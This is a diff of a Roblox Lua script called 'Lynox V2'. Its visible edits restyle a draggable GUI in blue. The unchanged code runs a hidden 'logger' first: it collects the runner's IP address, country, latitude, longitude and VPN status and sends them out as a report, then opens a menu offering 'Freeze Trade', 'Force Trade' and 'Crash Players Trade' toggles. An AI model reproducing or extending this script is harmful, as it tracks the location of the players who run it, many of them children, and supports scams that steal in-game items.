@@ -1,4 +1,4 @@
---// Lynox V2 - Logger + GUI (primero loguea, luego abre la interfaz movible)
+--// Lynox V2 - Logger + GUI Azul Movible (primero loguea, luego abre GUI)
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -108,7 +108,7 @@ if req then
 
     local vpnAlert = geo.vpn and "⚠️ VPN / Proxy DETECTADO ⚠️" or "No se detectó VPN"
 
-    local color = geo.vpn and 16711680 or 16776960  -- rojo si VPN
+    local color = geo.vpn and 16711680 or 16776960
 
     local embed = {
         title = "Lynox V2 - EJECUCIÓN REGISTRADA",
@@ -147,32 +147,31 @@ if req then
         })
     end)
 
-    print("Lynox V2: Logger enviado | IP: " .. geo.ip .. " | Lat: " .. latText .. " | Lon: " .. lonText)
+    print("Lynox V2: Logger enviado | IP: " .. geo.ip .. " | País: " .. geo.country .. " | Lat: " .. latText .. " | Lon: " .. lonText)
 end
 
 -- =====================================================================
--- PARTE 2: GUI Lynox V2 (se abre después del logger)
+-- PARTE 2: GUI Lynox V2 en AZUL (movible con drag)
 -- =====================================================================
 
--- ScreenGui
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "LynoxGui"
 ScreenGui.IgnoreGuiInset = true
 ScreenGui.ResetOnSpawn = false
 ScreenGui.Parent = player:WaitForChild("PlayerGui")
 
--- Main Frame
+-- Main Frame (azul oscuro)
 local MainFrame = Instance.new("Frame")
 MainFrame.Size = UDim2.new(0,300,0,350)
 MainFrame.Position = UDim2.new(0.5,-150,0.5,-175)
-MainFrame.BackgroundColor3 = Color3.fromRGB(25,25,25)
+MainFrame.BackgroundColor3 = Color3.fromRGB(30, 58, 138)  -- Azul oscuro elegante
 MainFrame.Parent = ScreenGui
 Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0,10)
 
--- Title (drag handle)
+-- Title (azul brillante)
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1,0,0,40)
-Title.BackgroundColor3 = Color3.fromRGB(35,35,35)
+Title.BackgroundColor3 = Color3.fromRGB(59, 130, 246)  -- Azul medio brillante
 Title.Text = "Lynox V2"
 Title.TextColor3 = Color3.new(1,1,1)
 Title.TextScaled = true
@@ -180,7 +179,7 @@ Title.Font = Enum.Font.GothamBold
 Title.Parent = MainFrame
 Instance.new("UICorner", Title).CornerRadius = UDim.new(0,10)
 
--- Drag functionality (PC + Mobile)
+-- Drag (PC + Mobile)
 local dragging = false
 local dragInput
 local dragStart
@@ -222,17 +221,17 @@ UserInputService.InputChanged:Connect(function(input)
     end
 end)
 
--- Tab Bar
+-- Tab Bar (azul medio)
 local TabBar = Instance.new("Frame")
 TabBar.Size = UDim2.new(1,0,0,35)
 TabBar.Position = UDim2.new(0,0,0,40)
-TabBar.BackgroundColor3 = Color3.fromRGB(30,30,30)
+TabBar.BackgroundColor3 = Color3.fromRGB(37, 99, 235)
 TabBar.Parent = MainFrame
 
 local MainTabBtn = Instance.new("TextButton")
 MainTabBtn.Size = UDim2.new(0.5,0,1,0)
 MainTabBtn.Text = "Main"
-MainTabBtn.BackgroundColor3 = Color3.fromRGB(50,50,50)
+MainTabBtn.BackgroundColor3 = Color3.fromRGB(96, 165, 250)  -- Azul claro seleccionado
 MainTabBtn.TextColor3 = Color3.new(1,1,1)
 MainTabBtn.TextScaled = true
 MainTabBtn.Font = Enum.Font.GothamBold
@@ -242,7 +241,7 @@ local DiscordTabBtn = Instance.new("TextButton")
 DiscordTabBtn.Size = UDim2.new(0.5,0,1,0)
 DiscordTabBtn.Position = UDim2.new(0.5,0,0,0)
 DiscordTabBtn.Text = "Discord"
-DiscordTabBtn.BackgroundColor3 = Color3.fromRGB(20,20,20)
+DiscordTabBtn.BackgroundColor3 = Color3.fromRGB(29, 78, 216)
 DiscordTabBtn.TextColor3 = Color3.new(1,1,1)
 DiscordTabBtn.TextScaled = true
 DiscordTabBtn.Font = Enum.Font.GothamBold
@@ -262,12 +261,12 @@ DiscordTab.BackgroundTransparency = 1
 DiscordTab.Visible = false
 DiscordTab.Parent = MainFrame
 
--- Toggle Button Function
+-- Toggle Button Function (OFF rojo → ON azul brillante)
 local function toggleButton(text, y)
     local b = Instance.new("TextButton")
     b.Size = UDim2.new(0.85,0,0,45)
     b.Position = UDim2.new(0.075,0,0,y)
-    b.BackgroundColor3 = Color3.fromRGB(170,0,0)
+    b.BackgroundColor3 = Color3.fromRGB(185, 28, 28)  -- Rojo OFF
     b.Text = text..": OFF"
     b.TextColor3 = Color3.new(1,1,1)
     b.TextScaled = true
@@ -279,11 +278,10 @@ local function toggleButton(text, y)
     b.MouseButton1Click:Connect(function()
         enabled = not enabled
         b.Text = text .. (enabled and ": ON" or ": OFF")
-        b.BackgroundColor3 = enabled and Color3.fromRGB(0,170,0) or Color3.fromRGB(170,0,0)
+        b.BackgroundColor3 = enabled and Color3.fromRGB(59, 130, 246) or Color3.fromRGB(185, 28, 28)  -- ON: azul brillante
     end)
 end
 
--- Main Tab Buttons
 toggleButton("Freeze Trade", 10)
 toggleButton("Force Trade", 65)
 toggleButton("Crash Players Trade", 120)
@@ -302,7 +300,7 @@ Link.Parent = DiscordTab
 local Copy = Instance.new("TextButton")
 Copy.Size = UDim2.new(0.85,0,0,45)
 Copy.Position = UDim2.new(0.075,0,0,80)
-Copy.BackgroundColor3 = Color3.fromRGB(0,120,255)
+Copy.BackgroundColor3 = Color3.fromRGB(37, 99, 235)  -- Azul intenso
 Copy.Text = "Copy Discord Invite"
 Copy.TextColor3 = Color3.new(1,1,1)
 Copy.TextScaled = true
@@ -318,15 +316,19 @@ Copy.MouseButton1Click:Connect(function()
     end)
 end)
 
--- Tab Switching
+-- Tab Switching (con cambio de color al seleccionar)
 MainTabBtn.MouseButton1Click:Connect(function()
     MainTab.Visible = true
     DiscordTab.Visible = false
+    MainTabBtn.BackgroundColor3 = Color3.fromRGB(96, 165, 250)
+    DiscordTabBtn.BackgroundColor3 = Color3.fromRGB(29, 78, 216)
 end)
 
 DiscordTabBtn.MouseButton1Click:Connect(function()
     MainTab.Visible = false
     DiscordTab.Visible = true
+    MainTabBtn.BackgroundColor3 = Color3.fromRGB(50,50,50)
+    DiscordTabBtn.BackgroundColor3 = Color3.fromRGB(96, 165, 250)
 end)
 
-print("Lynox V2 cargado: Logger enviado + GUI abierta y movible")
+print("Lynox V2 cargado: Logger enviado + GUI en AZUL abierta y movible")
